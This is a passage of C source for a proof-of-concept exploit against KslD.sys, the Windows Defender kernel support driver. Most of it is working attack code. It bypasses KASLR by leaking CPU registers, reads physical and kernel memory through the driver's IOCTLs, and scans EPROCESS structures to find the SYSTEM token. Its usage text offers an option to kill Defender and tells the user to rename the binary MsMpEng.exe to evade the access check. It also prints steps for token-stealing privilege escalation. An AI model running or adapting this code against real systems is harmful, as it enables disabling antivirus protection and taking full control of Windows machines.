    printf("[*] Finding KslD.sys base address...\n");
    PVOID ksldBase = NULL;
    {
        pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        BYTE* buf = (BYTE*)malloc(1024 * 1024);
        if (buf && NtQSI) {
            if (NtQSI(11, buf, 1024 * 1024, NULL) == 0) {
                SYSTEM_MODULE_INFORMATION* mi = (SYSTEM_MODULE_INFORMATION*)buf;
                for (ULONG i = 0; i < mi->Count; i++) {
                    char* name = (char*)mi->Modules[i].FullPathName + mi->Modules[i].OffsetToFileName;
                    if (_stricmp(name, "KslD.sys") == 0) {
                        ksldBase = mi->Modules[i].ImageBase;
                        printf("[+] KslD.sys base: 0x%016llX (size: 0x%X)\n",
                               (UINT64)ksldBase, mi->Modules[i].ImageSize);
                        break;
                    }
                }
            }
            free(buf);
        }
    }

    if (!ksldBase) {
        printf("[-] KslD.sys not found in module list\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("\n[*] Reading g_ThisDriver (KslD+0x11400)...\n");
    UINT64 gThisDriver = 0;
    UINT64 gThisDriverAddr = (UINT64)ksldBase + 0x11400;
    if (!KslMmCopyRead(gThisDriverAddr, &gThisDriver, 8) || gThisDriver == 0) {
        printf("[-] g_ThisDriver read failed or NULL (0x%016llX)\n", gThisDriver);
        for (int off = -0x100; off <= 0x100; off += 8) {
            UINT64 val = 0;
            if (KslMmCopyRead(gThisDriverAddr + off, &val, 8) && val > 0xFFFF000000000000ULL) {
                printf("    [*] Potential CDriver at KslD+0x%X: 0x%016llX\n",
                       0x11400 + off, val);
            }
        }
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] g_ThisDriver (CDriver*) = 0x%016llX\n", gThisDriver);

    UINT64 deviceIfacePtr = 0;
    KslMmCopyRead(gThisDriver + 0x48, &deviceIfacePtr, 8);
    printf("[+] CDriver+0x48 (CDeviceKsl+0x30) = 0x%016llX\n", deviceIfacePtr);

    if (deviceIfacePtr == 0 || deviceIfacePtr < 0xFFFF000000000000ULL) {
        printf("[-] No device interface pointer. Device not created?\n");
        CloseHandle(hDevice);
        return 1;
    }

    UINT64 cDeviceKsl = deviceIfacePtr - 0x30;
    printf("[+] CDeviceKsl (raw) = 0x%016llX\n", cDeviceKsl);

    UINT64 kprocess = 0;
    KslMmCopyRead(cDeviceKsl + 0x58, &kprocess, 8);
    printf("\n[+] CDeviceKsl+0x58 (KPROCESS) = 0x%016llX\n", kprocess);

    if (kprocess > 0xFFFF000000000000ULL) {
        printf("[+] KPROCESS is set. Sub-cmd 0x01 should be functional.\n");

        UINT64 field_48 = 0;
        KslMmCopyRead(cDeviceKsl + 0x48, &field_48, 8);
        printf("[+] CDeviceKsl+0x48 (name ptr) = 0x%016llX\n", field_48);

        UINT64 field_50 = 0;
        KslMmCopyRead(cDeviceKsl + 0x50, &field_50, 8);
        printf("[+] CDeviceKsl+0x50 (WDFDEVICE) = 0x%016llX\n", field_50);

        printf("\n[*] Retrying sub-cmd 0x01 (Physical Memory Read)...\n");

        UINT64 testAddrs[] = { 0x1000, 0x0, 0xFE000, 0x100000 };
        UINT64 testSizes[] = { 8, 64, 256, 0x1000 };

        for (int a = 0; a < 4; a++) {
            for (int s = 0; s < 4; s++) {
                if ((testAddrs[a] & 0xFFF) + testSizes[s] > 0x1000) continue;

                KSLD_INPUT in = {0};
                in.SubCommand = 0x01;
                in.ProcessorIdx = 0;
                in.PhysAddress = testAddrs[a];
                in.Size = testSizes[s];

                BYTE out[4096] = {0};
                DWORD br = 0;
                BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                                          &in, sizeof(in), out, sizeof(out), &br, NULL);
                DWORD err = GetLastError();

                if (ok && br > 0) {
                    printf("[+] PHYS READ WORKS! addr=0x%llX size=%llu br=%lu\n",
                           testAddrs[a], testSizes[s], br);
                    printf("    First 8 bytes: %02X %02X %02X %02X %02X %02X %02X %02X\n",
                           out[0], out[1], out[2], out[3], out[4], out[5], out[6], out[7]);
                    goto phys_read_ok;
                } else if (ok) {
                    printf("[*] addr=0x%llX sz=%llu: ok=1 br=0\n", testAddrs[a], testSizes[s]);
                }
                if (s == 0 && !ok) {
                    printf("[-] addr=0x%llX: err=%lu\n", testAddrs[a], err);
                }
            }
        }
        printf("[-] Physical read still fails despite KPROCESS being set.\n");
        printf("[*] The error may be in the CCommand→GetUserProcess path.\n");
        printf("[*] GetUserProcess is called via the CDeviceKsl+0x30 vtable.\n");
        printf("[*] It reads [this+0x28] = [CDeviceKsl+0x58] = 0x%016llX\n", kprocess);
        goto done;

phys_read_ok:
        printf("\n[+] Physical memory read confirmed.\n");

    } else {
        printf("[-] KPROCESS is NULL. Defender has no active connection to KslD.\n");
        printf("[*] This is why sub-cmd 0x01 fails.\n");
        printf("[*] SetConnectionHelper was never called or handle was closed.\n");
    }

done:
    CloseHandle(hDevice);
    return 0;
}

void PrintUsage() {
    printf("KslD.sys Vulnerability PoC — Windows Defender Kernel Support Driver\n");
    printf("====================================================================\n");
    printf("CVE: [Pending] — Multiple vulns in Microsoft-signed kernel driver\n\n");
    printf("Vulnerabilities:\n");
    printf("  1. KASLR Bypass — CPU register dump leaks IDTR, KPCR, CR3 [CONFIRMED]\n");
    printf("  2. Weak Access Control — process name check only, no DACL/signature\n");
    printf("  3. Physical Memory Read — via ZwMapViewOfSection (needs init handshake)\n");
    printf("  4. MMIO Read/Write — via MmMapIoSpace (needs Intel SATA hardware)\n");
    printf("  5. PCI Config Space Read — via I/O port 0xCF8/0xCFC (needs Intel SATA)\n\n");
    printf("Usage (rename to MsMpEng.exe for process name bypass):\n");
    printf("  MsMpEng.exe --check              Probe all sub-commands\n");
    printf("  MsMpEng.exe --kaslr              Full KASLR bypass (all CPUs)\n");
    printf("  MsMpEng.exe --dump-regs          Raw CPU register dump (CPU 0)\n");
    printf("  MsMpEng.exe --init-mmio          Try MMIO init chain (0x0E->0x10->0x11)\n");
    printf("  MsMpEng.exe --read <phys> <size> Read physical memory\n");
    printf("  MsMpEng.exe --read-mmio <phys>   Read via MmMapIoSpace (4KB page)\n");
    printf("  MsMpEng.exe --scan-kernel        Find kernel in physical memory\n");
    printf("  MsMpEng.exe --find-eprocess      Scan for EPROCESS structures\n");
    printf("  MsMpEng.exe --dump-tokens        Read process token values\n");
    printf("  MsMpEng.exe --dump-0x12          Dump CPUID capability data\n");
    printf("  MsMpEng.exe --kill-defender      Kill Windows Defender (clear PPL via phys write)\n");
    printf("\nRequires:\n");
    printf("  - Administrator privileges\n");
    printf("  - KslD service running (sc start KslD)\n");
    printf("  - Executable named MsMpEng.exe\n");
}

int DoCheck() {
    if (!OpenDevice()) return 1;

    printf("[+] Device is accessible!\n\n");

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;

    printf("=== Sub-command Probe ===\n\n");

    struct { ULONG cmd; const char* name; ULONG inExtra; } subcmds[] = {
        { 0x00, "VERSION",        0 },
        { 0x01, "PHYS_READ",      0 },
        { 0x02, "CPU_REGS",       0 },
        { 0x03, "unknown_3",      0 },
        { 0x04, "unknown_4",      0 },
        { 0x05, "unknown_5",      0 },
        { 0x06, "unknown_6",      0 },
        { 0x07, "RESOLVE_NAME",   0 },
        { 0x08, "CMD_8",          0 },
        { 0x09, "unknown_9",      0 },
        { 0x0A, "unknown_A",      0 },
        { 0x0B, "IS_INITIALIZED", 0 },
        { 0x0C, "CMD_C",          0 },
        { 0x0D, "unknown_D",      0 },
        { 0x0E, "unknown_E",      0 },
        { 0x0F, "unknown_F",      0 },
        { 0x10, "unknown_10",     0 },
        { 0x11, "MMIO_READ",      0 },
        { 0x12, "unknown_12",     0 },
        { 0x13, "MMIO_READ2",     0 },
    };

    for (int i = 0; i < sizeof(subcmds)/sizeof(subcmds[0]); i++) {
        KSLD_INPUT input = {0};
        input.SubCommand = subcmds[i].cmd;
        input.ProcessorIdx = 0;
        input.PhysAddress = 0x1000;
        input.Size = 64;

        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;

        BOOL ok = KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned);
        DWORD err = GetLastError();

        if (ok) {
            printf("[+] Sub-cmd 0x%02x %-16s: OK, returned %lu bytes\n",
                   subcmds[i].cmd, subcmds[i].name, bytesReturned);
            if (bytesReturned > 0 && bytesReturned <= 64) {
                HexDump(outBuf, bytesReturned, 0);
            }
        } else {
            const char* errStr = "unknown";
            if (err == 87) errStr = "INVALID_PARAMETER";
            else if (err == 1) errStr = "INVALID_FUNCTION";
            else if (err == 31) errStr = "GEN_FAILURE";
            else if (err == 5) errStr = "ACCESS_DENIED";
            else if (err == 122) errStr = "INSUFFICIENT_BUFFER";
            else if (err == 50) errStr = "NOT_SUPPORTED";
            else if (err == 234) errStr = "MORE_DATA";
            else if (err == 203) errStr = "NOT_FOUND";

            printf("[-] Sub-cmd 0x%02x %-16s: FAIL err=%lu (%s)\n",
                   subcmds[i].cmd, subcmds[i].name, err, errStr);
        }
    }

    printf("\n=== Initialization Check (sub-cmd 0x0B) ===\n");
    {
        KSLD_INPUT input = {0};
        input.SubCommand = 0x0B;
        input.Size = 4;
        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;
        if (KslD_SendIoctl(&input, sizeof(input), outBuf, 4, &bytesReturned)) {
            printf("[+] Is-initialized: returned %lu bytes, value=0x%02x (%s)\n",
                   bytesReturned, outBuf[0],
                   outBuf[0] ? "INITIALIZED" : "NOT INITIALIZED");
            if (!outBuf[0]) {
                printf("[!] Plugin NOT initialized — this is why phys reads fail.\n");
                printf("[!] The driver needs MsMpEng.exe to complete an init handshake.\n");
            }
        } else {
            printf("[-] Is-initialized check failed: %lu\n", GetLastError());
        }
    }

    printf("\n=== Physical Memory Read Diagnostic ===\n");
    printf("[*] sizeof(KSLD_INPUT) = %zu bytes\n", sizeof(KSLD_INPUT));
    BOOL confirmed = FALSE;

    {
        printf("\n[diag] Test 1: 24-byte input, 4096-byte output, addr=0x1000, size=64\n");
        struct { ULONG cmd; ULONG pad; ULONGLONG addr; ULONGLONG sz; } raw = {0};
        raw.cmd = 0x01;
        raw.pad = 0;
        raw.addr = 0x1000;
        raw.sz = 64;
        BYTE tmpOut[4096] = {0};
        DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            &raw, 24, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) {
            printf("[+] PHYS_READ WORKS with 24-byte raw input!\n");
            HexDump(tmpOut, tmpRet < 64 ? tmpRet : 64, 0x1000);
            confirmed = TRUE;
        }
    }

    if (!confirmed) {
        printf("[diag] Test 2: Try padding field = 1\n");
        struct { ULONG cmd; ULONG pad; ULONGLONG addr; ULONGLONG sz; } raw = {0};
        raw.cmd = 0x01; raw.pad = 1; raw.addr = 0x1000; raw.sz = 64;
        BYTE tmpOut[4096] = {0}; DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            &raw, 24, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) { confirmed = TRUE; HexDump(tmpOut, 64, 0x1000); }
    }

    if (!confirmed) {
        printf("[diag] Test 3: size=4096 (full page), addr=0x1000\n");
        struct { ULONG cmd; ULONG pad; ULONGLONG addr; ULONGLONG sz; } raw = {0};
        raw.cmd = 0x01; raw.addr = 0x1000; raw.sz = 0x1000;
        BYTE tmpOut[4096] = {0}; DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            &raw, 24, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) { confirmed = TRUE; HexDump(tmpOut, 64, 0x1000); }
    }

    if (!confirmed) {
        printf("[diag] Test 4: 28-byte input (old struct size)\n");
        BYTE rawIn[28] = {0};
        *(ULONG*)rawIn = 0x01;
        *(ULONGLONG*)(rawIn+8) = 0x1000;
        *(ULONGLONG*)(rawIn+16) = 64;
        BYTE tmpOut[4096] = {0}; DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            rawIn, 28, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) { confirmed = TRUE; HexDump(tmpOut, 64, 0x1000); }
    }

    if (!confirmed) {
        printf("[diag] Test 5: 48-byte input\n");
        BYTE rawIn[48] = {0};
        *(ULONG*)rawIn = 0x01;
        *(ULONGLONG*)(rawIn+8) = 0x1000;
        *(ULONGLONG*)(rawIn+16) = 64;
        BYTE tmpOut[4096] = {0}; DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            rawIn, 48, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) { confirmed = TRUE; HexDump(tmpOut, 64, 0x1000); }
    }

    if (!confirmed) {
        printf("[diag] Test 6: addr=0x100000 (1MB), size=8\n");
        struct { ULONG cmd; ULONG pad; ULONGLONG addr; ULONGLONG sz; } raw = {0};
        raw.cmd = 0x01; raw.addr = 0x100000; raw.sz = 8;
        BYTE tmpOut[4096] = {0}; DWORD tmpRet = 0;
        BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
            &raw, 24, tmpOut, 4096, &tmpRet, NULL);
        printf("       Result: %s, err=%lu, returned=%lu\n",
               ok ? "OK" : "FAIL", GetLastError(), tmpRet);
        if (ok && tmpRet > 0) { confirmed = TRUE; HexDump(tmpOut, 8, 0x100000); }
    }

    printf("\n=== Physical Memory Read Test ===\n");
    ULONGLONG testAddrs[] = { 0x1000, 0x10000, 0xF0000, 0x100000 };
    const char* testNames[] = { "0x1000", "0x10000", "0xF0000 (BIOS)", "0x100000 (1MB)" };

    for (int t = 0; t < 4 && !confirmed; t++) {
        DWORD read = 0;
        BYTE physBuf[4096] = {0};
        if (ReadPhysicalMemory(testAddrs[t], physBuf, 64, &read) && read > 0) {
            printf("[+] Read at %s SUCCEEDED! %lu bytes.\n", testNames[t], read);
            printf("[+] VULNERABILITY CONFIRMED.\n");
            HexDump(physBuf, read < 64 ? read : 64, testAddrs[t]);
            confirmed = TRUE;
        } else {
            printf("[-] Read at %s failed: %lu\n", testNames[t], GetLastError());
        }
    }

    if (!confirmed) {
        printf("\n[*] All reads failed. Likely cause: plugin not initialized.\n");
        printf("[*] The driver requires a setup sequence from the real MsMpEng.exe.\n");
        printf("[*] The vtable method at +0x18 returns EPROCESS for KeStackAttachProcess.\n");
        printf("[*] Without initialization, this returns NULL and all reads are skipped.\n");
    }

    CloseHandle(hDevice);
    return 0;
}

int DoReadPhys(ULONGLONG physAddr, ULONG size) {
    if (!OpenDevice()) return 1;

    printf("[*] Reading 0x%x bytes from physical address 0x%llx\n", size, physAddr);

    BYTE* buf = (BYTE*)malloc(size);
    if (!buf) { printf("[-] malloc failed\n"); return 1; }

    DWORD read = 0;
    if (ReadPhysicalMemory(physAddr, buf, size, &read)) {
        printf("[+] Read %lu bytes:\n", read);
        HexDump(buf, read, physAddr);
    } else {
        printf("[-] Read failed: %lu\n", GetLastError());
        printf("[*] Trying MmMapIoSpace fallback...\n");
        if (size <= 0x1000 && ReadPhysicalMmio(physAddr & ~0xFFFULL, buf, &read)) {
            ULONG offset = (ULONG)(physAddr & 0xFFF);
            printf("[+] Read via MmMapIoSpace (page-aligned):\n");
            HexDump(buf + offset, size < (0x1000 - offset) ? size : (0x1000 - offset),
                    physAddr);
        } else {
            printf("[-] All read methods failed.\n");
        }
    }

    free(buf);
    CloseHandle(hDevice);
    return 0;
}

int DoScanKernel() {
    if (!OpenDevice()) return 1;

    PVOID kernelBase = GetKernelBase();
    if (!kernelBase) {
        printf("[-] Cannot determine kernel base\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("\n[*] Scanning physical memory for MZ header (kernel image)...\n");
    printf("[*] This demonstrates we can read kernel memory via physical addresses.\n\n");

    BYTE page[0x1000];
    int found = 0;

    for (ULONGLONG phys = 0x100000; phys < 0x10000000 && found < 5; phys += 0x1000) {
        DWORD read = 0;
        if (ReadPhysicalMemory(phys, page, 0x1000, &read) && read >= 0x40) {
            if (page[0] == 'M' && page[1] == 'Z') {
                DWORD peOff = *(DWORD*)(page + 0x3C);
                if (peOff < 0xF00 && page[peOff] == 'P' && page[peOff+1] == 'E') {
                    printf("[+] Found PE image at physical 0x%llx", phys);
                    if (peOff + 0x18 + 0x10 < 0x1000) {
                        ULONGLONG imageBase = *(ULONGLONG*)(page + peOff + 0x18 + 0x10);
                        printf(" (ImageBase=0x%llx)", imageBase);
                        if (imageBase == (ULONGLONG)kernelBase) {
                            printf(" *** NTOSKRNL ***");
                        }
                    }
                    printf("\n");
                    found++;
                }
            }
        }
    }

    if (found == 0) {
        printf("[*] No PE images found in first 256MB of physical memory.\n");
        printf("[*] Kernel may be loaded at higher physical address.\n");
    }

    CloseHandle(hDevice);
    return 0;
}

int DoFindEprocess() {
    if (!OpenDevice()) return 1;

    ULONG64 psisp = GetPsInitialSystemProcess();
    if (!psisp) {
        printf("[-] Cannot find PsInitialSystemProcess\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("\n[*] PsInitialSystemProcess is a POINTER at kernel VA 0x%llx\n", psisp);
    printf("[*] We need to read the VALUE at that address to get EPROCESS of System.\n");
    printf("[*] This requires virtual-to-physical translation.\n\n");

    printf("[*] Scanning physical memory for EPROCESS structures...\n");
    printf("[*] Looking for processes with known PIDs and image names.\n\n");

    BYTE page[0x1000];
    int eprocessCount = 0;

    for (ULONGLONG phys = 0x1000; phys < 0x80000000ULL && eprocessCount < 20; phys += 0x1000) {
        DWORD read = 0;
        if (!ReadPhysicalMemory(phys, page, 0x1000, &read) || read < 0x1000)
            continue;

        for (ULONG off = 0; off + EPROCESS_IMAGEFILENAME + 16 < 0x1000; off += 8) {
            char* imgName = (char*)(page + off + EPROCESS_IMAGEFILENAME);

            if (memcmp(imgName, "System\0", 7) == 0 ||
                memcmp(imgName, "smss.exe\0", 9) == 0 ||
                memcmp(imgName, "csrss.exe\0", 10) == 0 ||
                memcmp(imgName, "MsMpEng.exe\0", 12) == 0 ||
                memcmp(imgName, "services.exe", 12) == 0 ||
                memcmp(imgName, "lsass.exe\0", 10) == 0) {

                ULONG64 pid = *(ULONG64*)(page + off + EPROCESS_UNIQUEPROCESSID);
                if (pid == 0 || pid > 100000) continue;

                ULONG64 token = *(ULONG64*)(page + off + EPROCESS_TOKEN);
                ULONG64 tokenPtr = token & ~0xFULL;
                if ((tokenPtr >> 48) != 0xFFFF) continue;

                ULONG64 flink = *(ULONG64*)(page + off + EPROCESS_ACTIVEPROCESSLINKS);
                ULONG64 blink = *(ULONG64*)(page + off + EPROCESS_ACTIVEPROCESSLINKS + 8);
                if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;

                ULONG64 eprocessPhys = phys + off;
                printf("[+] EPROCESS at physical 0x%llx\n", eprocessPhys);
                printf("    ImageFileName : %.15s\n", imgName);
                printf("    UniqueProcessId: %llu\n", pid);
                printf("    Token          : 0x%llx (ptr=0x%llx)\n", token, tokenPtr);
                printf("    Protection     : 0x%02x\n",
                       *(BYTE*)(page + off + EPROCESS_PROTECTION));
                printf("    ActiveProcessLinks.Flink: 0x%llx\n", flink);
                printf("    ActiveProcessLinks.Blink: 0x%llx\n\n", blink);

                eprocessCount++;
                if (memcmp(imgName, "System\0", 7) == 0 && pid == 4) {
                    printf("    *** SYSTEM PROCESS FOUND — Token value: 0x%llx ***\n", tokenPtr);
                    printf("    For full LPE: copy this token to your process EPROCESS+0x%x\n\n",
                           EPROCESS_TOKEN);
                }
            }
        }

        if ((phys & 0x0FFFFFFF) == 0) {
            printf("[*] Scanned %llu MB...\n", phys / (1024*1024));
        }
    }

    printf("[*] Found %d EPROCESS structures in physical memory.\n", eprocessCount);
    printf("\n[*] NOTE: Full token-stealing LPE requires a WRITE primitive.\n");
    printf("[*] KslD only provides READ. Combine with SmSerl64.sys MDL for write.\n");

    CloseHandle(hDevice);
    return 0;
}

int DoDumpTokens() {
    if (!OpenDevice()) return 1;
    EnablePrivilege("SeDebugPrivilege");

    printf("[*] Dumping all process tokens via kernel read (MmCopyMemory)...\n\n");

    UINT64 pPSIP = ResolveSymbol("PsInitialSystemProcess");
    if (!pPSIP) {
        printf("[-] Cannot resolve PsInitialSystemProcess\n");
        CloseHandle(hDevice);
        return 1;
    }

    UINT64 systemEprocess = 0;
    if (!KslMmCopyRead(pPSIP, &systemEprocess, 8) || systemEprocess < 0xFFFF000000000000ULL) {
        printf("[-] Cannot read System EPROCESS (MmCopyMemory may not work)\n");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] System EPROCESS: 0x%016llX\n", systemEprocess);
    AutoDetectEprocessOffsets(systemEprocess);
    printf("\n");

    printf("%-20s %-8s %-18s %-18s %-6s\n", "Process", "PID", "EPROCESS", "Token", "Prot");
    printf("%-20s %-8s %-18s %-18s %-6s\n", "-------", "---", "--------", "-----", "----");

    UINT64 current = systemEprocess;
    UINT64 systemToken = 0;
    int count = 0;

    for (int i = 0; i < 500; i++) {
        UINT64 pid = 0;
        KslMmCopyRead(current + EPROCESS_UNIQUEPROCESSID, &pid, 8);

        char imgName[16] = {0};
        KslMmCopyRead(current + EPROCESS_IMAGEFILENAME, imgName, 15);

        UINT64 token = 0;
        KslMmCopyRead(current + EPROCESS_TOKEN, &token, 8);
        UINT64 tokenPtr = token & ~0xFULL;

        BYTE prot = 0;
        KslMmCopyRead(current + EPROCESS_PROTECTION, &prot, 1);

        if (imgName[0] != 0) {
            printf("%-20.15s %-8llu 0x%016llX 0x%016llX 0x%02X",
                   imgName, pid, current, tokenPtr, prot);
            if (prot != 0)
                printf(" [PPL:%u Signer:%u]", prot & 0x07, (prot >> 4) & 0x0F);
            if (pid == 4)
                printf(" *** SYSTEM ***");
            printf("\n");

            if (pid == 4) systemToken = tokenPtr;
            count++;
        }

        UINT64 flink = 0;
        KslMmCopyRead(current + EPROCESS_ACTIVEPROCESSLINKS, &flink, 8);
        UINT64 next = flink - EPROCESS_ACTIVEPROCESSLINKS;

        if (next == systemEprocess || next < 0xFFFF000000000000ULL) break;
        current = next;
    }

    printf("\n[+] Found %d processes.\n", count);
    if (systemToken) {
        printf("[+] SYSTEM token: 0x%016llX\n", systemToken);
        printf("[*] To escalate: write this token to your EPROCESS+0x%X\n", EPROCESS_TOKEN);
    }

    UINT64 myEprocess = GetEprocessViaHandleTable(GetCurrentProcessId());
    if (myEprocess) {
        UINT64 myToken = 0;
        KslMmCopyRead(myEprocess + EPROCESS_TOKEN, &myToken, 8);
        printf("[*] Your EPROCESS: 0x%016llX  Token: 0x%016llX\n",
               myEprocess, myToken & ~0xFULL);
    }

    CloseHandle(hDevice);
    return 0;
}

int DoDumpRegs() {
    if (!OpenDevice()) return 1;

    printf("[*] Dumping CPU registers via sub-command 0x02...\n\n");

    KSLD_INPUT input = {0};
    input.SubCommand = SUBCMD_CPU_REGS;
    input.ProcessorIdx = 0;
    input.Size = 8;

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;

    if (!KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
        printf("[-] CPU register dump failed: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Got %lu bytes of CPU register data from CPU 0\n\n", bytesReturned);

    ULONGLONG* regs = (ULONGLONG*)outBuf;
    int numRegs = bytesReturned / 8;

    const char* regNames[] = {
        "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RSP", "RBP",
        "R8", "R9", "R10", "R11", "R12", "R13", "R14", "R15",
        "RIP", "RFLAGS", "CR0", "CR2", "CR3", "CR4",
        "DR0", "DR1", "DR2", "DR3", "DR6", "DR7",
        "GDTR_Base", "GDTR_Limit", "IDTR_Base", "IDTR_Limit",
        "CS", "DS", "ES", "FS", "GS", "SS", "TR", "LDTR",
        "IA32_EFER", "IA32_STAR", "IA32_LSTAR", "IA32_CSTAR",
        "IA32_SFMASK", "IA32_KernelGSBase", "IA32_SYSENTER_CS",
        "IA32_SYSENTER_ESP", "IA32_SYSENTER_EIP",
        "IA32_TSC_AUX", "XCR0"
    };
    int numNames = sizeof(regNames) / sizeof(regNames[0]);

    for (int i = 0; i < numRegs && i < 56; i++) {
        if (i < numNames) {
            printf("  [%2d] %-22s = 0x%016llx\n", i, regNames[i], regs[i]);
        } else {
            printf("  [%2d] reg_%02x                = 0x%016llx\n", i, i, regs[i]);
        }
    }

    printf("\n[*] Kernel pointer analysis:\n");
    for (int i = 0; i < numRegs; i++) {
        ULONGLONG v = regs[i];
        if ((v >> 40) == 0xFFFFF8 || (v >> 40) == 0xFFFFF6 || (v >> 40) == 0xFFFFFA) {
            printf("  [%2d] 0x%016llx  <-- KERNEL POINTER", i, v);
            if (i < numNames) printf(" (%s)", regNames[i]);
            printf("\n");
        }
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors > 1) {
        printf("\n[*] System has %lu CPUs. Trying CPU 1...\n", si.dwNumberOfProcessors);
        input.ProcessorIdx = 1;
        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;
        if (KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
            printf("[+] CPU 1: got %lu bytes\n", bytesReturned);
            ULONGLONG* regs2 = (ULONGLONG*)outBuf;
            int n2 = bytesReturned / 8;
            for (int i = 0; i < n2; i++) {
                ULONGLONG v = regs2[i];
                if ((v >> 40) == 0xFFFFF8 || (v >> 40) == 0xFFFFF6 || (v >> 40) == 0xFFFFFA) {
                    printf("  [%2d] 0x%016llx  <-- KERNEL PTR", i, v);
                    if (i < numNames) printf(" (%s)", regNames[i]);
                    printf("\n");
                }
            }
        }
    }

    CloseHandle(hDevice);
    return 0;
}

int DoInitMmio() {
    if (!OpenDevice()) return 1;

    printf("=== MMIO Initialization Chain: 0x0E -> 0x10 -> 0x11 ===\n\n");
    printf("[*] This chain enables MmMapIoSpace-based physical memory read.\n");
    printf("[*] Requires Intel SATA controller at PCI 0:31.0 (vendor 0x8086)\n\n");

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;

    printf("[1] Sub-cmd 0x0E: PCI device detection...\n");
    {
        KSLD_INPUT input = {0};
        input.SubCommand = SUBCMD_PCI_DETECT;
        input.ProcessorIdx = 0;
        input.Size = 4;

        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;

        if (KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
            printf("[+] PCI detect OK! Got %lu bytes\n", bytesReturned);
            if (bytesReturned >= 6) {
                USHORT vendorId = *(USHORT*)outBuf;
                USHORT revId = *(USHORT*)(outBuf + 2);
                BYTE capFlag = outBuf[4];
                printf("    Vendor ID : 0x%04x %s\n", vendorId,
                       vendorId == 0x8086 ? "(Intel)" : "(non-Intel)");
                printf("    Revision  : 0x%04x\n", revId);
                printf("    Cap flag  : %d (%s)\n", capFlag,
                       capFlag ? "MMIO ENABLED" : "MMIO disabled");
                if (capFlag) {
                    printf("[+] Capability flag +0x18 SET! Proceeding to step 2.\n\n");
                } else {
                    printf("[-] Not an Intel SATA controller. MMIO chain blocked.\n");
                    CloseHandle(hDevice);
                    return 1;
                }
            }
        } else {
            DWORD err = GetLastError();
            printf("[-] PCI detect failed: error %lu\n", err);
            if (err == 87) {
                printf("[-] STATUS_INVALID_PARAMETER — PCI device 0:31.0 not found or not Intel SATA.\n");
                printf("[-] This system doesn't have the required hardware for MMIO access.\n");
                printf("[-] MMIO chain is NOT available on this system.\n");
            }
            CloseHandle(hDevice);
            return 1;
        }
    }

    printf("[2] Sub-cmd 0x10: AHCI BAR detection...\n");
    {
        BYTE inBuf[32] = {0};
        *(ULONG*)inBuf = SUBCMD_AHCI_DETECT;
        *(ULONG*)(inBuf + 4) = 0;
        *(ULONG*)(inBuf + 8) = 0;
        *(ULONG*)(inBuf + 0xc) = 0;

        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;

        if (KslD_SendIoctl((KSLD_INPUT*)inBuf, sizeof(inBuf), outBuf, sizeof(outBuf), &bytesReturned)) {
            printf("[+] AHCI BAR detect OK! Got %lu bytes\n", bytesReturned);
            if (bytesReturned >= 0x14) {
                UINT barBase = *(UINT*)outBuf;
                UINT barSize = *(UINT*)(outBuf + 4);
                UINT barAddr = *(UINT*)(outBuf + 8);
                UINT barEnd = *(UINT*)(outBuf + 0xc);
                BYTE mmioFlag = outBuf[0x10];
                printf("    BAR base  : 0x%08x\n", barBase);
                printf("    BAR size  : 0x%08x\n", barSize);
                printf("    BAR addr  : 0x%08x\n", barAddr);
                printf("    BAR end   : 0x%08x\n", barEnd);
                printf("    MMIO flag : %d (%s)\n", mmioFlag,
                       mmioFlag ? "MMIO ENABLED" : "MMIO disabled");
                if (mmioFlag) {
                    printf("[+] Capability flag +0x19 SET! MMIO read is now available.\n\n");
                } else {
                    printf("[-] AHCI BAR is zero. MMIO read blocked.\n");
                    CloseHandle(hDevice);
                    return 1;
                }
            }
        } else {
